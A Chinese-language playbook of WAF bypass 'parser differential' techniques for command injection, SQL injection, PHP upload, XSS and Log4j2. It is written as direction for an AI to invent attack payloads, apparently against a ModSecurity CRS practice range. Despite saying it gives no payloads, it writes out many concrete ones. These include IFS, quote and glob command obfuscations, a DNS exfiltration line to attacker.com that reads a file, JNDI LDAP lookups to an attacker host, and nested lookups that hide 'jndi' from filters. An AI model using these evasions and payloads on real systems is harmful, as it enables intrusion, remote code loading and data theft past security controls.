# 解析器差异原语

本文档描述 **WAF 正则引擎**和**目标解析器**（shell、MySQL、PHP、浏览器）对同一输入的理解差异。每个条目是一个**差异原语**——描述差异的**本质**和**根因**，不提供具体 payload。

AI 的职责是理解这些差异原语，然后在这个空间里自由创造具体的 payload。

## 使用方式

1. 读一个差异原语 → 理解"WAF 看到什么 vs 解析器做了什么"
2. 推导出这个差异允许的**一般性绕过模式**
3. 针对当前场景的具体约束（目标路径、注入位置、成功标志）创造 payload
4. 控制变量法验证：只变这一个维度，确认归因

> **重要免责声明**：本文档中引用的 CRS 规则 ID（如 932100、942150 等）和"PL4 下已知被拦截/放行"标注是基于当前靶场（OWASP ModSecurity CRS PL4）的经验观察，**不代表其他 WAF 的行为**。迁移到不同 WAF 时，这些规则 ID 完全无效——每个 WAF 的注意力边界必须通过探测从零画出。标注了 `bash only` 的原语在 POSIX sh（dash）下不可用。

## 三层结构

```
词法层 → WAF 和解析器怎么把字节串切成 token
语法层 → 相同语义的不同语法表达
语义层 → 间接达成相同执行效果
```

同一个差异原语可能跨场景适用，标注在"适用场景"中。

## 场景快速索引

AI 遍历差异原语时，按场景定位对应章节，避免遗漏跨场景相关的原语：

| 场景 | 词法层 | 语法层 | 语义层 | 场景特异 |
|------|--------|--------|--------|----------|

| **SQLi** | 1.1 (空白), 1.2 (字符串引用), 1.4 (数字到关键字), 1.5 (注释拆分), 1.6 (废弃语法), 1.7 (大小写) | 2.1 (逻辑运算符替代), 2.2 (恒等变形), 2.3 (查询结构重组) | 3.1 (Prepared Statement) | — |

# 一、词法层（Lexical）

WAF 和解析器对同一串字节的切词方式不同。这是最基础、最常见的差异类别。

---

## 1.1 单词分割

**根因**：WAF 用正则按空格切 token，解析器有自己的一套分割规则。

**CMDi — Shell 的 IFS 分割**：
- WAF 看到空格才切词。`cat${IFS}/etc/passwd` 在 WAF 眼里是一整个字符串，没有空格就没有 token 边界。
- Shell 展开 `${IFS}` 后得到空格/制表符/换行，然后在这些位置切词。所以 `cat${IFS}/etc/passwd` 对 shell 来说就是 `cat /etc/passwd`。
- **核心 gap**：WAF 不认识 shell 变量展开的产物是分隔符。不只是 `${IFS}`——任何能产生空格的变量展开都可以。
- **探索空间**：IFS 的替代表示（`$IFS$9`、`${IFS:0:1}`）、其他能产生空格的变量、命令替换产生的空格。
- **约束**：`${IFS}` 在 CRS PL4 下已知被 932100 拦截。但"WAF 不认识变量展开产物"这个 gap 本身不限于 IFS——值得探索其他变量/命令替换的组合方式。
- **跨场景**：此差异仅限于 shell。SQL 有自己的空白处理（见 1.2），PHP 不需要切命令。

**SQLi — MySQL 的空白处理**：
- WAF 的 SQL 注入检测假设 token 由空格分隔。`UNION SELECT` 中间有空格 → WAF 认出两个关键字。
- MySQL 接受空格、制表符 `\t`、换行 `\n`、垂直制表 `\v`、回车 `\r`、换页符 `\f` 作为 token 分隔符。
- **核心 gap**：WAF 的正则用 `\s` 或空格匹配分隔符，但 MySQL 的空白字符集更大。某些空白字符 WAF 不认识但 MySQL 认识。
- **探索空间**：垂直制表符 `\v`、换页符 `\f`、Unicode 空白字符（如果 MySQL 版本支持）。
- **约束**：CRS PL4 的 libinjection 对 token 序列的检测不依赖具体空白字符。单纯换空白不一定够——需要和其他差异组合。

---

## 1.2 引号处理

**根因**：WAF 把引号当字面字符，解析器在特定条件下移除或忽略它们。

**CMDi — Shell 引号移除**：
- WAF 看到 `c'a't` → 三个字符片段：`c`、`'a'`、`t`。不是 `cat`。
- Shell 在单词分割后移除引号：单引号内所有字符保持原样但引号本身被移除。`c'a't` → `cat`。
- **核心 gap**：WAF 的字符串匹配是基于连续字符的。引号把连续字符串打断，WAF 的 `cat` 正则匹配不到 `c'a't`。
- **探索空间**：单引号 vs 双引号（双引号内 `$` 和 `` ` `` 仍展开，这意味着什么？）、多处插入引号（`c'a't` vs `c'a''t`）、反斜杠（shell 将其移除但不触发引号配对逻辑）。
- **约束**：POSIX sh（dash）和 bash 的引号行为基本一致。反斜杠在单引号内不生效（单引号内所有字符字面解释）。双引号内反斜杠对部分字符（`$` `` ` `` `"` `\` `!`）保留转义含义。
- **跨场景**：此差异对标 SQLi 的关键字拆分（见 1.5）。

**SQLi — MySQL 字符串引用**：
- MySQL 接受单引号和双引号作为字符串界定符（`sql_mode` 控制双引号行为）。
- **核心 gap**：WAF 的字符串检测正则可能只覆盖单引号版本，双引号版本被漏检。
- **约束**：双引号字符串在 MySQL 中的行为受 `ANSI_QUOTES` sql_mode 影响。默认模式下双引号等同单引号。

---

## 1.3 转义字符

**根因**：WAF 将反斜杠视为字面字符，解析器将其移除或解读。

**CMDi — Shell 反斜杠移除**：
- WAF 看到 `\c\a\t` → 六个字符，不是 `cat`。
- Shell 在引号处理前移除无引号的反斜杠。`\c` → `c`。所以 `\c\a\t` → `cat`。
- **核心 gap**：和引号拆分（1.2）类似但机制不同。反斜杠不需要配对，可以单独插入任意位置。
- **约束**：反斜杠在单引号内不生效（字面保留）。在双引号内对部分字符生效。这和引号拆分的交互值得探索——`c'a'\t` 的行为是什么？
- **跨场景**：此差异对标 MySQL 的转义行为。SQL 注入中的逃逸引号（`\'`）是此差异的特殊情况。

---

## 1.4 数字到关键字的无空格边界

**根因**：WAF 假设数字和关键字之间需要空格或标点，但解析器不需要。

**SQLi — MySQL 数字到关键字的自动切词**：
- WAF 的正则期望 `1 UNION SELECT`——数字 `1` 后有空格，然后才是关键字 `UNION`。
- MySQL 的数字解析器在遇到不能构成数字的字符时自动停止。`1.e0UNION` → MySQL 先解析 `1.e0` 为浮点数 `1.0`，然后下一个字符 `U` 不能是数字的一部分 → 自动开始新 token → `UNION`。
- **核心 gap**：WAF 的正则 `\d+\s+UNION` 不会匹配——中间没有空格。但 MySQL 不需要这个空格。
- **探索空间**：不只是 `1.e0`——任何 MySQL 数字字面量结尾 + 关键字开头都可以。整数 `1`、浮点 `1.0`、科学计数 `1e0`、十六进制 `0x1`……甚至尝试"如果 MySQL 接受八进制字面量 `0o1` 呢？"
- **约束**：有些数字形式（如 `1.` 结尾）在不同 MySQL 版本中行为可能不同。需要实际验证。

---

## 1.5 关键字内部的注释/空白

**根因**：WAF 按完整关键字匹配，解析器允许关键字被注释或空白打断。

**SQLi — MySQL 内联注释**：
- WAF 的正则匹配完整的 `UNION` 字符串。`UN/**/ION` → WAF 看到 `UN`、注释、`ION`——三个 token，不匹配 `UNION` 关键字。
- MySQL 移除注释后再解析。`UN/**/ION` → `UNION`。
- **核心 gap**：注释可以插入关键字的任意位置。不只是 `/**/`——MySQL 的版本化注释 `/*!50000*/` 也适用，而且版本化注释内的内容会被执行。
- **探索空间**：注释插入位置（开头、中间、末尾）、注释类型（普通 `/**/`、版本化 `/*!*/`、废弃 `{q ...}`）、注释嵌套。版本化注释内直接写关键字（`/*!50000UNION*/`）vs 注释拆分关键字（`UN/*!50000*/ION`）。
- **约束**：`/*!*/` 需要 MySQL 版本号。不同版本对版本号阈值的处理。
- **跨场景**：对标 CMDi 的引号拆分（1.2）——都是打断 WAF 的连续字符串匹配。一个用引号，一个用注释。

---

## 1.6 废弃/兼容语法

**根因**：解析器为向后兼容保留了已被官方废弃的语法，WAF 的正则不知道这些语法的存在。

**SQLi — MySQL 废弃注释语法**：
- MySQL 除了 `/* */` 和 `/*! */` 之外，还接受一种名为 "deprecated comment syntax" 的形式：`{q ...}`。它在 MySQL 内部被解析为注释并被忽略。
- WAF 的正则库没有覆盖 `{q ...}` 这个模式——它太罕见了，正则作者大概率不知道。
- **核心 gap**：`{q UNION}` → MySQL 忽略这个"注释"，继续解析后续内容。WAF 可能完全不认识 `{q` 语法，直接放行。
- **探索空间**：MySQL 是否还有其他废弃或非标准注释形式？不同 MySQL 版本对废弃语法的支持程度不同——8.0 和 5.7 可能有差异。

---

## 1.7 大小写

**根因**：WAF 的正则可能区分大小写，解析器不区分。

**SQLi — MySQL 关键字**：
- WAF 的正则可能写为 `UNION`（精确匹配）或 `[Uu][Nn][Ii][Oo][Nn]`（大小写不敏感但仍是精确字符匹配）。
- MySQL 关键字不区分大小写。`UnIoN` = `union` = `UNION`。
- **核心 gap**：大小写混用增加了正则匹配的复杂度。某些边缘 case（如全大写+一个字母小写）可能被漏检。
- **跨场景**：XSS 的标签名同样不区分大小写（`<ScRiPt>` = `<script>`）。CMDi 的命令名区分大小写，不适用。

# 二、语法层（Syntactical）

同等语义效果可以用不同的语法结构表达。WAF 的正则覆盖了最常见的那种，但没覆盖全部。

---

## 2.1 逻辑运算符替代

**根因**：WAF 的正则匹配 `AND`、`OR` 关键字，但解析器接受其他等效写法。

**SQLi — MySQL 的 `||` 和 `&&`**：
- WAF 的正则库对 `OR 1=1`、`' OR '1'='1` 等模式高度敏感。
- MySQL 在 `PIPES_AS_CONCAT` 关闭（默认关闭）时，`||` 就是逻辑 OR，`&&` 就是逻辑 AND。
- **核心 gap**：`' || 1=1` → WAF 看不到 `OR` 关键字。整个 CRS 942 系列专注于检测 `OR` + 数字/引号的模式，不会触发。
- **探索空间**：不只是 `||`——MySQL 的 `XOR` 是否也被 WAF 漏检？`NOT` 的组合方式？

**SQLi — 用户变量赋值作为布尔表达式**：
- MySQL 的 `@var := value` 或 `@var = value` 在布尔上下文中被求值。赋值操作总是成功（返回 true）。
- WAF 不认识 `@a=1` 是一个恒真表达式。WAF 在找 `1=1`、`'a'='a'` 这类明显的恒等比较。
- **核心 gap**：任何用户变量赋值都可以作为恒真/恒假条件。WAF 的恒等式检测覆盖的是字面量比较，不包括赋值。
- **探索空间**：`<(@a=1)`、`>(@b:=0)`——比较操作符 + 赋值。`|| @a:=1`——逻辑 OR + 赋值。MySQL 用户变量的生命周期（会话级别，跨查询共享）意味着什么？

---

## 2.2 恒等变形

**根因**：WAF 检测的是"经典恒等式模式"，但解析器在特定上下文中接受更多形式的恒等表达式。

**SQLi — 算术恒等**：
- WAF 的正则检测 `1=1`、`'a'='a'`——两个相同值做等值比较。
- MySQL 在数值上下文中：`+0` 加任何值都不变，`-0` 减任何值都不变，`*1` 乘任何值都不变，`/1` 除任何值都不变。
- **核心 gap**：`'+0+'` 闭合字符串引号后 → 字符串 + 0 = 0（MySQL 的类型转换）→ 数值恒等。整个过程没有 `=` 号，没有 `OR`，没有 `AND`。
- **探索空间**：不只是加法和乘法——位运算（`|0`、`&~0`）、字符串函数（`TRIM()`、`REPLACE()` 如果不改变值）。数学恒等式（`a = a + 0 = a * 1 = a XOR 0 = a | 0`）。

---

## 2.3 查询结构重组

**根因**：WAF 的正则训练于特定的 SQL 查询模式（WHERE + UNION），但同样的数据提取可以用完全不同的查询结构实现。

**SQLi — 非 WHERE 子句注入**：
- WAF 的注入检测（libinjection + 942 系列）主要训练于 WHERE 子句中的注入模式。UNION SELECT、OR 1=1、AND SLEEP——全在 WHERE 上下文中。
- 注入可以出现在 ORDER BY、GROUP BY、HAVING、LIMIT、SELECT 列列表——这些位置的语法不同，token 序列完全不同。
- **核心 gap**：ORDER BY 后面不能跟 UNION SELECT（语法错误）——但 WAF 不知道这个。WAF 仍在找 UNION 关键字，但攻击者根本不需要用 UNION——`(CASE WHEN (条件) THEN 1 ELSE 5 END)` 在 ORDER BY 中完全合法，不含任何被 WAF 重点检测的关键字。
- **探索空间**：每个非 WHERE 注入位置（ORDER BY、GROUP BY、HAVING、LIMIT、SELECT 列、INTO 子句）各自有哪些语法上合法的数据提取方式？WAF 对这些模式为什么漏检？

**SQLi — 子查询替代 UNION**：
- UNION SELECT 是提取额外数据的最直接方式，也是 WAF 检测的首要目标。
- 子查询（scalar subquery）可以嵌入 SELECT 列表、WHERE 条件中，并且不需要 UNION 关键字。
- **核心 gap**：`AND (SELECT flag FROM flags LIMIT 1) = 'expected_value'`——没有 UNION，没有引号逃逸，就是标准的子查询语法。WAF 把它当作正常的嵌套查询。

---

## 2.4 函数/命令调用方式替代

**根因**：WAF 的正则匹配特定的函数名或调用模式。解析器接受多种等效的调用方式。

**CMDi — 非黑名单命令**：
- WAF 的命令黑名单（932160）只覆盖了常见的网络/文件读取命令：`wget`、`curl`、`nc`、`sleep`、`base64`、`whoami` 等。
- Shell 有大量不在黑名单的命令同样能读文件：`dd`、`tee`、`cut`、`sort`、`tr`、`file`、`awk`、`sed`、`head`、`tail`、`fold`、`hexdump`、`cmp`、`diff`……这个列表远长于黑名单。
- **核心 gap**：WAF 的命令检测依赖黑名单，不是"是否读文件"。只要命令名不在黑名单里，WAF 就不认识。
- **探索空间**：不是简单地换命令——每个非黑名单命令有自己独特的参数语法和输出格式。`dd if=FILE`、`tee <FILE`、`cut -c1-1000 FILE`——WAF 的正则需要为每个命令写单独的检测规则，但显然不可能覆盖所有命令。

**PHP — 动态函数调用**：
- WAF 检测 `system(`、`exec(`、`shell_exec(` 等函数名字面量。
- PHP 支持变量函数：`$f = 'system'; $f('cmd');`；字符串拼接后调用：`('sys'.'tem')('cmd');`；回调：`call_user_func('system', 'cmd');`。
- **核心 gap**：函数名字面量从代码中消失。WAF 只能在代码中匹配函数名，不能跟踪变量赋值和字符串拼接。
- **探索空间**：PHP 中还有其他间接调用函数的方式吗？类方法回调？`array_map` 等数组函数？`preg_replace` 的 `/e` 修饰符（旧版本）？

---

## 2.5 路径/资源引用方式的替代

**根因**：WAF 的路径黑名单匹配字面路径字符串。解析器接受多种等效的路径引用方式。

**CMDi — Shell 路径 glob**：
- WAF 的路径黑名单（932115）匹配字面路径模式：`/etc/*`、`/proc/*`、`/var/log/*` 等。
- Shell 在执行命令前展开通配符。`/???/passwd` → `/etc/passwd`。`/[e]tc/[m]otd` → `/etc/motd`。
- **核心 gap**：WAF 看到的是含通配符的字符串，不是黑名单中的路径。shell 展开后才变成黑名单路径。
- **探索空间**：`?` 匹配单字符，`*` 匹配任意，`[...]` 字符集。组合使用——`/???/???d` vs `/[ef]tc/mo[a-z]d`——WAF 需要理解 glob 展开才能检测，但它不理解。

**CMDi — 变量间接引用路径** ⚠️ `${VAR:offset:length}` 是 **bash only**（POSIX sh/dash 不支持子串展开）：
- WAF 看到 `${PATH:0:1}bin/${PATH:0:1}cat` → 一堆变量语法，不是 `/bin/cat`。
- Bash 展开 `${PATH:0:1}` → `/`（PATH 的第一个字符）。所以整个字符串展开为 `/bin/cat`。
- **核心 gap**：WAF 不执行变量展开。它看到的字符串和 shell 实际执行的根本不同。
- **探索空间**：不只是 PATH——HOME、USER、SHELL……任何已知内容的环境变量都可以用来间接引用字符。甚至可以嵌套：`${${SHELL}:0:1}` 先展开 SHELL 再取第一个字符？

---

## 2.6 逻辑链稀释

**根因**：WAF 的检测基于单个请求/单个参数中的攻击特征。将攻击拆分成多个"看似无害"的步骤，每步都不触发 WAF。

**CMDi — 无害操作拼接**：
- `;cat /etc/motd` → WAF 在一个参数里看到分隔符 + 文件读取命令 + 路径。
- `;file /srv/data/db.json && cat /srv/data/db.json` → `file` 命令不在黑名单，`cat` 跟在 `&&` 后面——整个模式变了。
- **核心 gap**：WAF 把整个参数当作一个攻击字符串来分析。但 `file X && cat X` 的 token 序列和直接 `cat X` 完全不同。`file` 是信息查询命令，WAF 不过滤。
- **探索空间**：`&&` vs `||` vs `;` + `[ $? -eq 0 ]`。不同逻辑链对 WAF token 序列的影响。哪个"前置无害操作"能最有效地改变 token 序列形态？

# 三、语义层（Semantical）

不是语法表达不同，而是执行路径不同。攻击效果相同，但达成效果的机制避开了 WAF 的检测模型。

---

## 3.1 间接执行

**根因**：WAF 建模的是输入→输出的直接映射。通过中间层间接执行，WAF 无法关联输入和最终执行的命令。

**SQLi — Prepared Statement 滥用**：
- WAF 检测的是用户参数中是否包含 SQL 注入 token。`PREPARE` 和 `EXECUTE` 本身可能触发评分，但不一定。
- MySQL 8.0 允许在 SQL 中动态构建和执行 prepared statement：`SET @a = CONCAT('SE','LECT ...'); PREPARE s FROM @a; EXECUTE s;`——SQL 语句在运行时拼接，WAF 需要在词法分析阶段看到完整的恶意 SQL。
- **核心 gap**：WAF 做的是静态分析（看参数内容），Prepared Statement 是动态执行（运行时拼接）。WAF 没有运行时上下文。
- **探索空间**：CONCAT 的替代方式——直接用 `=` 赋值、多个变量逐步拼接、利用数据库函数返回值作为 SQL 片段。

---

## 3.2 环境操纵

**根因**：WAF 建模的是"输入→命令执行"的直接管道。环境变量和文件系统是侧信道，不在 WAF 的检测模型中。

**CMDi — PATH 投毒**：
- WAF 检测用户输入中是否包含命令分隔符和命令名。`system($input)` → WAF 检查 `$input` 的内容。
- 如果通过另一条路径修改了环境变量（如 `putenv("PATH=/tmp")`），然后 `system` 调用了一个看似无害的命令——实际执行的可能是 `/tmp/` 下的恶意二进制文件。
- **核心 gap**：WAF 看到的是 `system("id")` → `id` 是无害命令，放行。但实际执行的是 `/tmp/id`（因为 PATH 被改了）。WAF 不做文件系统分析。
- **约束**：此差异需要靶场支持多步骤的环境操纵（如 Upload L4）。不是所有场景都适用。

---

## 3.3 空回显攻击

**根因**：WAF 的检测模型基于"请求→响应"的即时关联。无回显攻击通过带外信道（DNS、HTTP）泄漏数据，WAF 无法关联几秒后的一次 DNS 查询和之前的请求。

**CMDi — 无回显注入（OOB）**：
- WAF 检测请求中是否有攻击特征，检查响应中是否有敏感数据。`;cat /etc/motd` → 响应中包含文件内容 → WAF 可能在响应中检测到敏感数据模式。
- `;nslookup $(cat /etc/motd | tr -d '\n').attacker.com` → 响应为空，但 /etc/motd 的内容作为 DNS 子域名被发送到 attacker.com。
- **核心 gap**：WAF 在响应中找不到任何敏感数据。数据通过 DNS 侧信道离开——WAF 不理解 DNS 查询和 HTTP 请求之间的因果关系。
- **约束**：需要 OOB 接收服务器（DNSLog 或 Burp Collaborator）。此差异主要用于数据提取阶段——先确认命令可否执行，再通过 OOB 外带数据。

# 四、场景特异差异

以下差异是特定解析器独有的行为，不为跨场景类比。

---

## 4.1 PHP — 短标签和替代标签

- WAF 检测 `<?php` 和 `<?=` 作为 PHP 代码开始的标志。
- PHP 还支持短标签 `<?`（`short_open_tag=On`）和 ASP 标签 `<%`（`asp_tags=On`，PHP 7 移除）。
- **核心 gap**：`<?=` 是 PHP 5.4+ 的永久特性，不需要 `short_open_tag`。它比 `<?php` 更短（3 字符 vs 5 字符），留给 WAF 的内容检查窗口更小。`<?=` 后面可以跟任意 PHP 表达式，包括变量函数调用。
- **约束**：`<?` 依赖配置，`<%` 已移除。`<?=` 是唯一可靠且被 CRS 重点检测的替代标签。

---

## 4.2 PHP — 文件头伪造

- WAF 检查上传文件的前 N 字节中是否包含 `<?php` 或 `<?=`。GIF header 伪装（`GIF89a<?php ...`）在前 1KB 内仍会被检测。
- PHP 只执行 `<?php`/`<?=` 标签内的代码。文件开头的非 PHP 内容被直接输出。
- **核心 gap**：这不是关于"PHP 是否认 GIF89a"——PHP 确实忽略它。问题是 WAF 仍能在文件开头检测到 PHP 标签。真正的 gap 在于：如果 PHP 标签前的"伪装内容"足够多/足够乱，能否使 WAF 的内容检测失效？或者，PHP 标签能否以 WAF 不认识但 PHP 认识的方式出现？
- **探索空间**：PHP 标签的位置（XML 声明后？BOM 后？）、标签的编码变形（归编码 Skill）。

---

## 4.3 XSS — 浏览器容错解析

- WAF 查找严格模式的 HTML 标签。`<img src=x onerror=alert(1)>` 在 WAF 看来缺少引号、缺少闭合标签。
- 浏览器高度容错：省略属性引号、省略闭合 `>`、标签大小写混合、自闭合标签——全部能正确解析并触发事件处理器。
- **核心 gap**：WAF 的正则通常假设 HTML 是格式良好的——带引号的属性值、闭合的标签。真实的浏览器解析器远比 WAF 的正则"宽容"。
- **探索空间**：省略引号（`onerror=alert(1)` vs `onerror="alert(1)"`）、省略闭合标签（`<img src=x onerror=alert(1)` 没有最后的 `>`）、属性之间的空白变体、标签名大小写。

---

## 4.4 Log4j2 — Lookup 递归解析

**根因**：WAF 对输入做单次正则匹配，Log4j2 的消息处理器对 `${...}` 做**递归解析**——每次解析后可能产生新的 `${...}` 表达式，继续解析直到没有更多 lookup 为止。WAF 看到的原始字符串和 Log4j2 最终解析的结果可能完全不同。

**基础形式**：`${jndi:ldap://attacker.com/a}` —— WAF 和 Log4j2 都看到 `jndi:ldap://`，这是最容易被检测的形态。

**核心 gap**：WAF 的正则匹配 `jndi:` 子串。如果 `jndi` 这个字符串本身由嵌套的 lookup 表达式动态构造，WAF 看到的是构造过程，Log4j2 看到的是构造结果。

**差异原语列表**：

### 4.4.1 字符变换（lower/upper）

- WAF 看到 `${lower:j}ndi:ldap://...` → `lower:j` 不是 `jndi`，不匹配黑名单。
- Log4j2 先解析 `${lower:j}` → `j`，字符串变为 `${jndi:ldap://...}`，然后解析 JNDI。
- **探索空间**：`${upper:j}` → `J`。`${lower:L}` → `l`。组合使用：`${${lower:j}ndi:ldap://...}`（嵌套——外层 lookup 的结果本身是一个 lookup）。

### 4.4.2 空字符串默认值拼接（`:-` 语法）

- `${::-x}` 的含义：查找变量 `""`（空字符串名）→ 不存在 → 使用默认值 `x`。所以 `${::-j}${::-n}${::-d}${::-i}` → `jndi`。
- WAF 看到的是 4 个独立的 `${::-X}` 表达式，中间没有连续的 `jndi` 子串。
- **核心 gap**：WAF 无法追踪 4 个独立 lookup 的拼接结果。每个 `${::-X}` 单独看都是无害的字符串操作。
- **探索空间**：混合使用 `:-` 和其他默认值语法。在 `ldap` 上也用同样的拆分。

### 4.4.3 环境变量默认值（`env` 语法）

- `${env:NOTEXIST:-j}` 的含义：查找环境变量 `NOTEXIST` → 不存在 → 使用默认值 `j`。
- WAF 看到的是环境变量查找，不是 JNDI 注入。`env:NOTEXIST:-j` 对 WAF 来说是完全无害的字符串。
- **核心 gap**：WAF 不认识 `${env:...}` 语法，更不会追踪其默认值。Log4j2 解析后得到单个字符 `j`，然后和其他部分拼接成 `jndi`。
- **探索空间**：`${env:NOTEXIST:-j}${env:NOTEXIST:-n}...` → 完整的 `jndi`。使用真实存在的环境变量（如 `${env:HOME}`）作为干扰。

### 4.4.4 协议字符串混淆

- 不仅是 `jndi` 部分可以混淆，`ldap` 也可以：`${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://...}`。
- 甚至 `://` 也可以：`${jndi:ldap${::-:}//...}`。
- **核心 gap**：WAF 对整个 `${jndi:ldap://...}` 做模式匹配。如果协议和 scheme 都被拆分到多个嵌套 lookup 中，WAF 看不到任何完整的攻击特征。
- **探索空间**：`ldaps`、`dns`、`rmi`、`iiop`、`http`——JNDI 支持多种协议，每个都可以被混淆。

### 4.4.5 嵌套递归

- `${${lower:j}ndi:ldap://...}` → 外层是 `${...}`，内层先解析 `${lower:j}` → `j`，然后外层变为 `${jndi:ldap://...}` → 触发 JNDI。
- WAF 看最外层 `${...}`：内容以 `${lower:j}` 开头、以 `ndi:ldap://...` 结尾。不以 `jndi:` 开头 → 不匹配黑名单。
- **核心 gap**：WAF 做单层匹配——只看第一个 `${` 到对应 `}` 之间的内容。Log4j2 解析内层 `${lower:j}` 后才看到 `jndi:...`。
- **探索空间**：多层嵌套（`${${${lower:j}...}}`）、不同类型的嵌套 lookup 组合（`${${env:...}${lower:...}}`）。

### 4.4.6 干扰 Lookup（注意力稀释）

- 在真正的攻击 payload 前后插入无害的 lookup 表达式：`${date:yyyy}${jndi:ldap://...}${sys:java.version}`。
- WAF 的正则可能因为字符串变长、token 序列改变而评分不足。
- **核心 gap**：WAF 对输入的整体评分受 token 密度影响。插入无害的 `${...}` 表达式稀释了恶意 token 的密度。
- **探索空间**：`${java:os}`、`${sys:user.name}`、`${log4j:configLocation}`——Log4j2 支持大量内置 lookup，都可以作为干扰。

### Log4j2 绕过约束

- curl 只能判定 WAF 层——HTTP 200/403。实际 JNDI 回调需要 OOB 服务器（DNSLog / Burp Collaborator）确认。
- WAF 放行的变体仅标记为"WAF 层通过"，需 OOB 确认后才算完整绕过。
- Log4j2 版本差异：2.15.0 禁用了大部分 lookup（仅保留 `java:` 和 `sys:`），2.16.0 完全禁用 JNDI。靶场版本决定了哪些差异原语有效。

# 五、跨层组合

差异原语的最大威力不在于单独使用，而在于组合。

## 组合原则

1. **同层组合**：同一差异原语的不同变体（如词法层的引号拆分 + 转义字符）→ 加深绕过
2. **跨层组合**：词法层打散 token + 语法层换表达方式 + 语义层换执行路径 → 最难检测
3. **控制变量**：组合时仍坚持"每次只加一层"——验证每层的贡献，不盲目堆叠

## 组合示例（仅示意跨层协同的逻辑）

```
词法层 "引号拆分" + 语法层 "路径 glob" 
  → WAF 既看不到命令名(c'a't)，也看不到路径(/???/???d)
  → 两个差异原语作用于 payload 的不同部分，互不冲突

词法层 "数字到关键字无空格" + 语法层 "查询结构重组"
  → 既改变了 SQL 的 token 级形态，又改变了整体结构
```

具体如何组合——每个攻击场景的约束不同，AI 自行判断。
